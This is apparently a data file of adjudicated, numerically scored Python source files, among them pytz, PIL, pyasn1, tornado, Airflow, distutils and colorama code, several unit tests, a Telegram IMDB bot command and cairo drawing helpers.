pytz.NonExistentTimeError<<NEWL>>    ):<<NEWL>>        pass<<NEWL>><<NEWL>>    class UnknownTimeZoneError(<<NEWL>>        UnknownTimeZoneError_, pytz.UnknownTimeZoneError<<NEWL>>    ):<<NEWL>>        pass<<NEWL>><<NEWL>>    PYTZ_BASE_ERROR_MAPPING.update(<<NEWL>>        {<<NEWL>>            InvalidTimeError_: InvalidTimeError,<<NEWL>>            AmbiguousTimeError_: AmbiguousTimeError,<<NEWL>>            NonExistentTimeError_: NonExistentTimeError,<<NEWL>>            UnknownTimeZoneError_: UnknownTimeZoneError,<<NEWL>>        }<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>def get_exception(exc_type, msg):<<NEWL>>    _make_pytz_derived_errors()<<NEWL>><<NEWL>>    out_exc_type = PYTZ_BASE_ERROR_MAPPING.get(exc_type, exc_type)<<NEWL>><<NEWL>>    return out_exc_type(msg)"
187	adjudicated	3	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># sequence support classes<<NEWL>>#<<NEWL>># history:<<NEWL>># 1997-02-20 fl     Created<<NEWL>>#<<NEWL>># Copyright (c) 1997 by Secret Labs AB.<<NEWL>># Copyright (c) 1997 by Fredrik Lundh.<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>>##<<NEWL>><<NEWL>><<NEWL>>class Iterator:<<NEWL>>    """"""<<NEWL>>    This class implements an iterator object that can be used to loop<<NEWL>>    over an image sequence.<<NEWL>><<NEWL>>    You can use the ``[]`` operator to access elements by index. This operator<<NEWL>>    will raise an :py:exc:`IndexError` if you try to access a nonexistent<<NEWL>>    frame.<<NEWL>><<NEWL>>    :param im: An image object.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, im):<<NEWL>>        if not hasattr(im, ""seek""):<<NEWL>>            msg = ""im must have seek method""<<NEWL>>            raise AttributeError(msg)<<NEWL>>        self.im = im<<NEWL>>        self.position = getattr(self.im, ""_min_frame"", 0)<<NEWL>><<NEWL>>    def __getitem__(self, ix):<<NEWL>>        try:<<NEWL>>            self.im.seek(ix)<<NEWL>>            return self.im<<NEWL>>        except EOFError as e:<<NEWL>>            raise IndexError from e  # end of sequence<<NEWL>><<NEWL>>    def __iter__(self):<<NEWL>>        return self<<NEWL>><<NEWL>>    def __next__(self):<<NEWL>>        try:<<NEWL>>            self.im.seek(self.position)<<NEWL>>            self.position += 1<<NEWL>>            return self.im<<NEWL>>        except EOFError as e:<<NEWL>>            raise StopIteration from e<<NEWL>><<NEWL>><<NEWL>>def all_frames(im, func=None):<<NEWL>>    """"""<<NEWL>>    Applies a given function to all frames in an image or a list of images.<<NEWL>>    The frames are returned as a list of separate images.<<NEWL>><<NEWL>>    :param im: An image, or a list of images.<<NEWL>>    :param func: The function to apply to all of the image frames.<<NEWL>>    :returns: A list of images.<<NEWL>>    """"""<<NEWL>>    if not isinstance(im, list):<<NEWL>>        im = [im]<<NEWL>><<NEWL>>    ims = []<<NEWL>>    for imSequence in im:<<NEWL>>        current = imSequence.tell()<<NEWL>><<NEWL>>        ims += [im_frame.copy() for im_frame in Iterator(imSequence)]<<NEWL>><<NEWL>>        imSequence.seek(current)<<NEWL>>    return [func(im) for im in ims] if func else ims"
356	adjudicated	0	#<<NEWL>># This file is part of pyasn1-modules software.<<NEWL>>#<<NEWL>># Created by Russ Housley.<<NEWL>>#<<NEWL>># Copyright (c) 2019, Vigil Security, LLC<<NEWL>># License: http://snmplabs.com/pyasn1/license.html<<NEWL>>#<<NEWL>># RSAES-OAEP Key Transport Algorithm in CMS<<NEWL>>#<<NEWL>># Notice that all of the things needed in RFC 3560 are also defined<<NEWL>># in RFC 4055.  So, they are all pulled from the RFC 4055 module into<<NEWL>># this one so that people looking a RFC 3560 can easily find them.<<NEWL>>#<<NEWL>># ASN.1 source from:<<NEWL>># https://www.rfc-editor.org/rfc/rfc3560.txt<<NEWL>>#<<NEWL>><<NEWL>>from pyasn1_modules import rfc4055<<NEWL>><<NEWL>>id_sha1 = rfc4055.id_sha1<<NEWL>><<NEWL>>id_sha256 = rfc4055.id_sha256<<NEWL>><<NEWL>>id_sha384 = rfc4055.id_sha384<<NEWL>><<NEWL>>id_sha512 = rfc4055.id_sha512<<NEWL>><<NEWL>>id_mgf1 = rfc4055.id_mgf1<<NEWL>><<NEWL>>rsaEncryption = rfc4055.rsaEncryption<<NEWL>><<NEWL>>id_RSAES_OAEP = rfc4055.id_RSAES_OAEP<<NEWL>><<NEWL>>id_pSpecified = rfc4055.id_pSpecified<<NEWL>><<NEWL>>sha1Identifier = rfc4055.sha1Identifier<<NEWL>><<NEWL>>sha256Identifier = rfc4055.sha256Identifier<<NEWL>><<NEWL>>sha384Identifier = rfc4055.sha384Identifier<<NEWL>><<NEWL>>sha512Identifier = rfc4055.sha512Identifier<<NEWL>><<NEWL>>mgf1SHA1Identifier = rfc4055.mgf1SHA1Identifier<<NEWL>><<NEWL>>mgf1SHA256Identifier = rfc4055.mgf1SHA256Identifier<<NEWL>><<NEWL>>mgf1SHA384Identifier = rfc4055.mgf1SHA384Identifier<<NEWL>><<NEWL>>mgf1SHA512Identifier = rfc4055.mgf1SHA512Identifier<<NEWL>><<NEWL>>pSpecifiedEmptyIdentifier = rfc4055.pSpecifiedEmptyIdentifier<<NEWL>><<NEWL>><<NEWL>>class RSAES_OAEP_params(rfc4055.RSAES_OAEP_params):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>rSAES_OAEP_Default_Params = RSAES_OAEP_params()<<NEWL>><<NEWL>>rSAES_OAEP_Default_Identifier = rfc4055.rSAES_OAEP_Default_Identifier<<NEWL>><<NEWL>>rSAES_OAEP_SHA256_Params = rfc4055.rSAES_OAEP_SHA256_Params<<NEWL>><<NEWL>>rSAES_OAEP_SHA256_Identifier = rfc4055.rSAES_OAEP_SHA256_Identifier<<NEWL>><<NEWL>>rSAES_OAEP_SHA384_Params = rfc4055.rSAES_OAEP_SHA384_Params<<NEWL>><<NEWL>>rSAES_OAEP_SHA384_Identifier = rfc4055.rSAES_OAEP_SHA384_Identifier<<NEWL>><<NEWL>>rSAES_OAEP_SHA512_Params = rfc4055.rSAES_OAEP_SHA512_Params<<NEWL>><<NEWL>>rSAES_OAEP_SHA512_Identifier = rfc4055.rSAES_OAEP_SHA512_Identifier
418	adjudicated	4	"#<<NEWL>># Copyright 2011 Facebook<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License""); you may<<NEWL>># not use this file except in compliance with the License. You may obtain<<NEWL>># a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT<<NEWL>># WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the<<NEWL>># License for the specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>""""""Implementation of platform-specific functionality.<<NEWL>><<NEWL>>For each function or class described in `tornado.platform.interface`,<<NEWL>>the appropriate platform-specific implementation exists in this module.<<NEWL>>Most code that needs access to this functionality should do e.g.::<<NEWL>><<NEWL>>    from tornado.platform.auto import set_close_exec<<NEWL>>""""""<<NEWL>><<NEWL>>from __future__ import absolute_import, division, print_function<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>if 'APPENGINE_RUNTIME' in os.environ:<<NEWL>>    from tornado.platform.common import Waker<<NEWL>><<NEWL>>    def set_close_exec(fd):<<NEWL>>        pass<<NEWL>>elif os.name == 'nt':<<NEWL>>    from tornado.platform.common import Waker<<NEWL>>    from tornado.platform.windows import set_close_exec<<NEWL>>else:<<NEWL>>    from tornado.platform.posix import set_close_exec, Waker<<NEWL>><<NEWL>>try:<<NEWL>>    # monotime monkey-patches the time module to have a monotonic function<<NEWL>>    # in versions of python before 3.3.<<NEWL>>    import monotime<<NEWL>>    # Silence pyflakes warning about this unused import<<NEWL>>    monotime<<NEWL>>except ImportError:<<NEWL>>    pass<<NEWL>>try:<<NEWL>>    # monotonic can provide a monotonic function in versions of python before<<NEWL>>    # 3.3, too.<<NEWL>>    from monotonic import monotonic as monotonic_time<<NEWL>>except ImportError:<<NEWL>>    try:<<NEWL>>        from time import monotonic as monotonic_time<<NEWL>>    except ImportError:<<NEWL>>        monotonic_time = None<<NEWL>><<NEWL>>__all__ = ['Waker', 'set_close_exec', 'monotonic_time']"
509	adjudicated	1	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>""""""Example DAG demonstrating the usage of the BranchPythonOperator.""""""<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import random<<NEWL>><<NEWL>>import pendulum<<NEWL>><<NEWL>>from airflow import DAG<<NEWL>>from airflow.operators.empty import EmptyOperator<<NEWL>>from airflow.operators.python import BranchPythonOperator<<NEWL>>from airflow.utils.edgemodifier import Label<<NEWL>>from airflow.utils.trigger_rule import TriggerRule<<NEWL>><<NEWL>>with DAG(<<NEWL>>    dag_id=""example_branch_operator"",<<NEWL>>    start_date=pendulum.datetime(2021, 1, 1, tz=""UTC""),<<NEWL>>    catchup=False,<<NEWL>>    schedule=""@daily"",<<NEWL>>    tags=[""example"", ""example2""],<<NEWL>>) as dag:<<NEWL>>    run_this_first = EmptyOperator(<<NEWL>>        task_id=""run_this_first"",<<NEWL>>    )<<NEWL>><<NEWL>>    options = [""branch_a"", ""branch_b"", ""branch_c"", ""branch_d""]<<NEWL>><<NEWL>>    branching = BranchPythonOperator(<<NEWL>>        task_id=""branching"",<<NEWL>>        python_callable=lambda: random.choice(options),<<NEWL>>    )<<NEWL>>    run_this_first >> branching<<NEWL>><<NEWL>>    join = EmptyOperator(<<NEWL>>        task_id=""join"",<<NEWL>>        trigger_rule=TriggerRule.NONE_FAILED_MIN_ONE_SUCCESS,<<NEWL>>    )<<NEWL>><<NEWL>>    for option in options:<<NEWL>>        t = EmptyOperator(<<NEWL>>            task_id=option,<<NEWL>>        )<<NEWL>><<NEWL>>        empty_follow = EmptyOperator(<<NEWL>>            task_id=""follow_"" + option,<<NEWL>>        )<<NEWL>><<NEWL>>        # Label is optional here, but it can help identify more complex branches<<NEWL>>        branching >> Label(option) >> t >> empty_follow >> join"
449	adjudicated	1	"""""""distutils.command.install_scripts<<NEWL>><<NEWL>>Implements the Distutils 'install_scripts' command, for installing<<NEWL>>Python scripts.""""""<<NEWL>><<NEWL>># contributed by Bastian Kleineidam<<NEWL>><<NEWL>>import os<<NEWL>>from distutils.core import Command<<NEWL>>from distutils import log<<NEWL>>from stat import ST_MODE<<NEWL>><<NEWL>><<NEWL>>class install_scripts(Command):<<NEWL>>    description = ""install scripts (Python or otherwise)""<<NEWL>><<NEWL>>    user_options = [<<NEWL>>        (""install-dir="", ""d"", ""directory to install scripts to""),<<NEWL>>        (""build-dir="", ""b"", ""build directory (where to install from)""),<<NEWL>>        (""force"", ""f"", ""force installation (overwrite existing files)""),<<NEWL>>        (""skip-build"", None, ""skip the build steps""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = [""force"", ""skip-build""]<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.install_dir = None<<NEWL>>        self.force = 0<<NEWL>>        self.build_dir = None<<NEWL>>        self.skip_build = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        self.set_undefined_options(""build"", (""build_scripts"", ""build_dir""))<<NEWL>>        self.set_undefined_options(<<NEWL>>            ""install"",<<NEWL>>            (""install_scripts"", ""install_dir""),<<NEWL>>            (""force"", ""force""),<<NEWL>>            (""skip_build"", ""skip_build""),<<NEWL>>        )<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        if not self.skip_build:<<NEWL>>            self.run_command(""build_scripts"")<<NEWL>>        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)<<NEWL>>        if os.name == ""posix"":<<NEWL>>            # Set the executable bits (owner, group, and world) on<<NEWL>>            # all the scripts we just installed.<<NEWL>>            for file in self.get_outputs():<<NEWL>>                if self.dry_run:<<NEWL>>                    log.info(""changing mode of %s"", file)<<NEWL>>                else:<<NEWL>>                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777<<NEWL>>                    log.info(""changing mode of %s to %o"", file, mode)<<NEWL>>                    os.chmod(file, mode)<<NEWL>><<NEWL>>    def get_inputs(self):<<NEWL>>        return self.distribution.scripts or []<<NEWL>><<NEWL>>    def get_outputs(self):<<NEWL>>        return self.outfiles or []"
459	adjudicated	1	"# This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>><<NEWL>>import os<<NEWL>>import shutil<<NEWL>>import sys<<NEWL>>import tempfile<<NEWL>>import unittest<<NEWL>>from typing import Optional<<NEWL>>from unittest.mock import MagicMock<<NEWL>><<NEWL>><<NEWL>>class TestFileIO(unittest.TestCase):<<NEWL>><<NEWL>>    _tmpdir: Optional[str] = None<<NEWL>>    _tmpfile: Optional[str] = None<<NEWL>>    _tmpfile_contents = ""Hello, World""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def setUpClass(cls) -> None:<<NEWL>>        cls._tmpdir = tempfile.mkdtemp()<<NEWL>>        with open(os.path.join(cls._tmpdir, ""test.txt""), ""w"") as f:<<NEWL>>            cls._tmpfile = f.name<<NEWL>>            f.write(cls._tmpfile_contents)<<NEWL>>            f.flush()<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def tearDownClass(cls) -> None:<<NEWL>>        # Cleanup temp working dir.<<NEWL>>        if cls._tmpdir is not None:<<NEWL>>            shutil.rmtree(cls._tmpdir)  # type: ignore<<NEWL>><<NEWL>>    def test_file_io(self):<<NEWL>>        from fairseq.file_io import PathManager<<NEWL>><<NEWL>>        with PathManager.open(os.path.join(self._tmpdir, ""test.txt""), ""r"") as f:<<NEWL>>            s = f.read()<<NEWL>>        self.assertEqual(s, self._tmpfile_contents)<<NEWL>><<NEWL>>    def test_file_io_oss(self):<<NEWL>>        # Mock iopath to simulate oss environment.<<NEWL>>        sys.modules[""iopath""] = MagicMock()<<NEWL>>        from fairseq.file_io import PathManager<<NEWL>><<NEWL>>        with PathManager.open(os.path.join(self._tmpdir, ""test.txt""), ""r"") as f:<<NEWL>>            s = f.read()<<NEWL>>        self.assertEqual(s, self._tmpfile_contents)<<NEWL>><<NEWL>>    def test_file_io_async(self):<<NEWL>>        # ioPath `PathManager` is initialized after the first `opena` call.<<NEWL>>        try:<<NEWL>>            from fairseq.file_io import IOPathManager, PathManager<<NEWL>>            _asyncfile = os.path.join(self._tmpdir, ""async.txt"")<<NEWL>>            f = PathManager.opena(_asyncfile, ""wb"")<<NEWL>>            f.close()<<NEWL>><<NEWL>>        finally:<<NEWL>>            self.assertTrue(PathManager.async_close())"
408	adjudicated	0	"# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.<<NEWL>>import atexit<<NEWL>>import contextlib<<NEWL>>import sys<<NEWL>><<NEWL>>from .ansitowin32 import AnsiToWin32<<NEWL>><<NEWL>><<NEWL>>orig_stdout = None<<NEWL>>orig_stderr = None<<NEWL>><<NEWL>>wrapped_stdout = None<<NEWL>>wrapped_stderr = None<<NEWL>><<NEWL>>atexit_done = False<<NEWL>><<NEWL>><<NEWL>>def reset_all():<<NEWL>>    if AnsiToWin32 is not None:  # Issue #74: objects might become None at exit<<NEWL>>        AnsiToWin32(orig_stdout).reset_all()<<NEWL>><<NEWL>><<NEWL>>def init(autoreset=False, convert=None, strip=None, wrap=True):<<NEWL>>    if not wrap and any([autoreset, convert, strip]):<<NEWL>>        raise ValueError(""wrap=False conflicts with any other arg=True"")<<NEWL>><<NEWL>>    global wrapped_stdout, wrapped_stderr<<NEWL>>    global orig_stdout, orig_stderr<<NEWL>><<NEWL>>    orig_stdout = sys.stdout<<NEWL>>    orig_stderr = sys.stderr<<NEWL>><<NEWL>>    if sys.stdout is None:<<NEWL>>        wrapped_stdout = None<<NEWL>>    else:<<NEWL>>        sys.stdout = wrapped_stdout = wrap_stream(<<NEWL>>            orig_stdout, convert, strip, autoreset, wrap<<NEWL>>        )<<NEWL>>    if sys.stderr is None:<<NEWL>>        wrapped_stderr = None<<NEWL>>    else:<<NEWL>>        sys.stderr = wrapped_stderr = wrap_stream(<<NEWL>>            orig_stderr, convert, strip, autoreset, wrap<<NEWL>>        )<<NEWL>><<NEWL>>    global atexit_done<<NEWL>>    if not atexit_done:<<NEWL>>        atexit.register(reset_all)<<NEWL>>        atexit_done = True<<NEWL>><<NEWL>><<NEWL>>def deinit():<<NEWL>>    if orig_stdout is not None:<<NEWL>>        sys.stdout = orig_stdout<<NEWL>>    if orig_stderr is not None:<<NEWL>>        sys.stderr = orig_stderr<<NEWL>><<NEWL>><<NEWL>>@contextlib.contextmanager<<NEWL>>def colorama_text(*args, **kwargs):<<NEWL>>    init(*args, **kwargs)<<NEWL>>    try:<<NEWL>>        yield<<NEWL>>    finally:<<NEWL>>        deinit()<<NEWL>><<NEWL>><<NEWL>>def reinit():<<NEWL>>    if wrapped_stdout is not None:<<NEWL>>        sys.stdout = wrapped_stdout<<NEWL>>    if wrapped_stderr is not None:<<NEWL>>        sys.stderr = wrapped_stderr<<NEWL>><<NEWL>><<NEWL>>def wrap_stream(stream, convert, strip, autoreset, wrap):<<NEWL>>    if wrap:<<NEWL>>        wrapper = AnsiToWin32(stream, convert=convert, strip=strip, autoreset=autoreset)<<NEWL>>        if wrapper.should_wrap():<<NEWL>>            stream = wrapper.stream<<NEWL>>    return stream"
346	adjudicated	1	"from textwrap import dedent<<NEWL>><<NEWL>>from flaky import flaky<<NEWL>><<NEWL>>from .test_embed_kernel import setup_kernel<<NEWL>><<NEWL>>TIMEOUT = 15<<NEWL>><<NEWL>><<NEWL>>@flaky(max_runs=3)<<NEWL>>def test_ipython_start_kernel_userns():<<NEWL>>    cmd = dedent(<<NEWL>>        """"""<<NEWL>>        from ipykernel.kernelapp import launch_new_instance<<NEWL>>        ns = {""tre"": 123}<<NEWL>>        launch_new_instance(user_ns=ns)<<NEWL>>        """"""<<NEWL>>    )<<NEWL>><<NEWL>>    with setup_kernel(cmd) as client:<<NEWL>>        client.inspect(""tre"")<<NEWL>>        msg = client.get_shell_msg(timeout=TIMEOUT)<<NEWL>>        content = msg[""content""]<<NEWL>>        assert content[""found""]<<NEWL>>        text = content[""data""][""text/plain""]<<NEWL>>        assert ""123"" in text<<NEWL>><<NEWL>>        # user_module should be an instance of DummyMod<<NEWL>>        client.execute(""usermod = get_ipython().user_module"")<<NEWL>>        msg = client.get_shell_msg(timeout=TIMEOUT)<<NEWL>>        content = msg[""content""]<<NEWL>>        assert content[""status""] == ""ok""<<NEWL>>        client.inspect(""usermod"")<<NEWL>>        msg = client.get_shell_msg(timeout=TIMEOUT)<<NEWL>>        content = msg[""content""]<<NEWL>>        assert content[""found""]<<NEWL>>        text = content[""data""][""text/plain""]<<NEWL>>        assert ""DummyMod"" in text<<NEWL>><<NEWL>><<NEWL>>@flaky(max_runs=3)<<NEWL>>def test_ipython_start_kernel_no_userns():<<NEWL>>    # Issue #4188 - user_ns should be passed to shell as None, not {}<<NEWL>>    cmd = dedent(<<NEWL>>        """"""<<NEWL>>        from ipykernel.kernelapp import launch_new_instance<<NEWL>>        launch_new_instance()<<NEWL>>        """"""<<NEWL>>    )<<NEWL>><<NEWL>>    with setup_kernel(cmd) as client:<<NEWL>>        # user_module should not be an instance of DummyMod<<NEWL>>        client.execute(""usermod = get_ipython().user_module"")<<NEWL>>        msg = client.get_shell_msg(timeout=TIMEOUT)<<NEWL>>        content = msg[""content""]<<NEWL>>        assert content[""status""] == ""ok""<<NEWL>>        client.inspect(""usermod"")<<NEWL>>        msg = client.get_shell_msg(timeout=TIMEOUT)<<NEWL>>        content = msg[""content""]<<NEWL>>        assert content[""found""]<<NEWL>>        text = content[""data""][""text/plain""]<<NEWL>>        assert ""DummyMod"" not in text"
197	adjudicated	1	"import requests<<NEWL>>from requests.exceptions import JSONDecodeError, ConnectionError<<NEWL>><<NEWL>>from pyrogram import filters<<NEWL>>from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup<<NEWL>><<NEWL>>from HotspotRobot import pbot, SUPPORT_CHAT<<NEWL>><<NEWL>><<NEWL>>@pbot.on_message(filters.command(""imdb""))<<NEWL>>async def imdb(client, message):<<NEWL>>    text = message.text.split("" "", 1)<<NEWL>>    if len(text) == 1:<<NEWL>>        return await message.reply_text(""Â» É¢Éªá´ á´ á´á´ ê±á´á´á´ á´á´á´ Éªá´ É´á´á´á´.\n   á´x. /imdb Altron"")<<NEWL>><<NEWL>>    try:<<NEWL>>        response = requests.get(f""https://api.safone.me/tmdb?query={text[1]}"").json()[""results""][0]<<NEWL>>    except (JSONDecodeError, ConnectionError) as e:<<NEWL>>        return await message.reply_text(<<NEWL>>            f""**Some Error Occured:** á´Êá´á´ê±á´ Êá´á´á´Êá´ Éªá´ á´á´ á´á´Ê [ê±á´á´á´á´Êá´ á´Êá´á´](https://t.me/{SUPPORT_CHAT}).""<<NEWL>>            f""\n\n**Error:** {e}""<<NEWL>>            )<<NEWL>><<NEWL>>    poster = response[""poster""]<<NEWL>>    imdb_link = response[""imdbLink""]<<NEWL>>    title = response[""title""]<<NEWL>>    rating = response[""rating""]<<NEWL>>    releasedate = response[""releaseDate""]<<NEWL>>    description = response[""overview""]<<NEWL>>    popularity = response[""popularity""]<<NEWL>>    runtime = response[""runtime""]<<NEWL>>    status = response[""status""]<<NEWL>><<NEWL>>    await client.send_photo(<<NEWL>>        message.chat.id,<<NEWL>>        poster,<<NEWL>>        caption=f""""""**Â» IMDB Movie Details:**<<NEWL>><<NEWL>>â£ **Title** = `{title}`<<NEWL>>â£ **Description** = `{description}`<<NEWL>>â£ **Rating** = `{rating}`<<NEWL>>â£ **Release-Date** = `{releasedate}`<<NEWL>>â£ **Popularity** = `{popularity}`<<NEWL>>â£ **Runtime** = `{runtime}`<<NEWL>>â£ **Status** = `{status}`<<NEWL>>"""""",<<NEWL>>        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text=""â¢ Éªá´á´Ê ÊÉªÉ´á´ â¢"", url=imdb_link)]])<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>__help__ = """"""<<NEWL>>  â² /imdb <á´á´á´ Éªá´ É´á´á´á´>: É¢á´á´ ê°á´ÊÊ ÉªÉ´ê°á´ á´Êá´á´á´ á´ á´á´á´ Éªá´ ê°Êá´á´ [imdb.com](https://m.imdb.com)<<NEWL>>""""""<<NEWL>>__mod_name__ = ""Iá´á´Ê"""
206	adjudicated	1	"#!/usr/bin/env python<<NEWL>># SPDX-License-Identifier: ISC<<NEWL>><<NEWL>>#<<NEWL>># Copyright (c) 2023 by<<NEWL>># Donatas Abraitis <donatas@opensourcerouting.org><<NEWL>>#<<NEWL>><<NEWL>>""""""<<NEWL>>Check if IPv6 Link-Local BGP peering works fine.<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>import sys<<NEWL>>import json<<NEWL>>import pytest<<NEWL>>import functools<<NEWL>><<NEWL>>CWD = os.path.dirname(os.path.realpath(__file__))<<NEWL>>sys.path.append(os.path.join(CWD, ""../""))<<NEWL>><<NEWL>># pylint: disable=C0413<<NEWL>>from lib import topotest<<NEWL>>from lib.topogen import Topogen, TopoRouter, get_topogen<<NEWL>><<NEWL>>pytestmark = [pytest.mark.bgpd]<<NEWL>><<NEWL>><<NEWL>>def build_topo(tgen):<<NEWL>>    for routern in range(1, 3):<<NEWL>>        tgen.add_router(""r{}"".format(routern))<<NEWL>><<NEWL>>    switch = tgen.add_switch(""s1"")<<NEWL>>    switch.add_link(tgen.gears[""r1""])<<NEWL>>    switch.add_link(tgen.gears[""r2""])<<NEWL>><<NEWL>><<NEWL>>def setup_module(mod):<<NEWL>>    tgen = Topogen(build_topo, mod.__name__)<<NEWL>>    tgen.start_topology()<<NEWL>><<NEWL>>    router_list = tgen.routers()<<NEWL>><<NEWL>>    for i, (rname, router) in enumerate(router_list.items(), 1):<<NEWL>>        router.load_config(<<NEWL>>            TopoRouter.RD_ZEBRA, os.path.join(CWD, ""{}/zebra.conf"".format(rname))<<NEWL>>        )<<NEWL>>        router.load_config(<<NEWL>>            TopoRouter.RD_BGP, os.path.join(CWD, ""{}/bgpd.conf"".format(rname))<<NEWL>>        )<<NEWL>><<NEWL>>    tgen.start_router()<<NEWL>><<NEWL>><<NEWL>>def teardown_module(mod):<<NEWL>>    tgen = get_topogen()<<NEWL>>    tgen.stop_topology()<<NEWL>><<NEWL>><<NEWL>>def test_bgp_ipv6_link_local_peering():<<NEWL>>    tgen = get_topogen()<<NEWL>><<NEWL>>    if tgen.routers_have_failure():<<NEWL>>        pytest.skip(tgen.errors)<<NEWL>><<NEWL>>    r1 = tgen.gears[""r1""]<<NEWL>><<NEWL>>    def _bgp_converge():<<NEWL>>        output = json.loads(r1.vtysh_cmd(""show bgp summary json""))<<NEWL>>        expected = {<<NEWL>>            ""ipv4Unicast"": {<<NEWL>>                ""peers"": {<<NEWL>>                    ""fe80:1::2"": {<<NEWL>>                        ""state"": ""Established"",<<NEWL>>                    }<<NEWL>>                }<<NEWL>>            }<<NEWL>>        }<<NEWL>>        return topotest.json_cmp(output, expected)<<NEWL>><<NEWL>>    test_func = functools.partial(_bgp_converge)<<NEWL>>    _, result = topotest.run_and_expect(test_func, None, count=60, wait=0.5)<<NEWL>>    assert result is None, ""Failed to see BGP convergence on R2""<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    args = [""-s""] + sys.argv[1:]<<NEWL>>    sys.exit(pytest.main(args))"
86	adjudicated	1	"import cairo<<NEWL>>from color import Color, palette<<NEWL>>import numpy as np<<NEWL>><<NEWL>><<NEWL>>def set_color(cr, color, a=1):<<NEWL>>    if color.a == 1.0:<<NEWL>>        cr.set_source_rgba(color.r, color.g, color.b, a)<<NEWL>>    else:<<NEWL>>        cr.set_source_rgba(color.r, color.g, color.b, color.a)<<NEWL>><<NEWL>><<NEWL>>def draw_px_cross(cr, x, y, length_px, color=palette[""RED""]):<<NEWL>>    """"""Draws a cross with fixed dimensions in pixel space.""""""<<NEWL>>    set_color(cr, color)<<NEWL>>    cr.move_to(x, y - length_px)<<NEWL>>    cr.line_to(x, y + length_px)<<NEWL>>    cr.stroke()<<NEWL>><<NEWL>>    cr.move_to(x - length_px, y)<<NEWL>>    cr.line_to(x + length_px, y)<<NEWL>>    cr.stroke()<<NEWL>>    set_color(cr, palette[""WHITE""])<<NEWL>><<NEWL>><<NEWL>>def draw_px_x(cr, x, y, length_px1, color=palette[""BLACK""]):<<NEWL>>    """"""Draws a x with fixed dimensions in pixel space.""""""<<NEWL>>    length_px = length_px1 / np.sqrt(2)<<NEWL>>    set_color(cr, color)<<NEWL>>    cr.move_to(x - length_px, y - length_px)<<NEWL>>    cr.line_to(x + length_px, y + length_px)<<NEWL>>    cr.stroke()<<NEWL>><<NEWL>>    cr.move_to(x - length_px, y + length_px)<<NEWL>>    cr.line_to(x + length_px, y - length_px)<<NEWL>>    cr.stroke()<<NEWL>>    set_color(cr, palette[""WHITE""])<<NEWL>><<NEWL>><<NEWL>>def draw_circle(cr, x, y, radius, color=palette[""RED""]):<<NEWL>>    set_color(cr, color)<<NEWL>>    cr.arc(x, y, radius, 0, 2 * np.pi)<<NEWL>>    cr.fill()<<NEWL>>    cr.stroke()<<NEWL>><<NEWL>><<NEWL>>def draw_control_points_cross(cr,<<NEWL>>                              points,<<NEWL>>                              width=10,<<NEWL>>                              radius=4,<<NEWL>>                              color=palette[""BLUE""]):<<NEWL>>    for i in range(0, len(points)):<<NEWL>>        draw_px_x(cr, points[i][0], points[i][1], width, color)<<NEWL>>        set_color(cr, color)<<NEWL>>        cr.arc(points[i][0], points[i][1], radius, 0, 2.0 * np.pi)<<NEWL>>        cr.fill()<<NEWL>>        set_color(cr, palette[""WHITE""])<<NEWL>><<NEWL>><<NEWL>>def display_text(cr, text, widtha, heighta, widthb, heightb):<<NEWL>>    cr.scale(widtha, -heighta)<<NEWL>>    cr.show_text(text)<<NEWL>>    cr.scale(widthb, -heightb)<<NEWL>><<NEWL>><<NEWL>>def draw_points(cr, p, size):<<NEWL>>    for i in range(0, len(p)):<<NEWL>>        draw_px_cross(cr, p[i][0], p[i][1], size,<<NEWL>>                      Color(0, np.sqrt(0.2 * i), 0))"
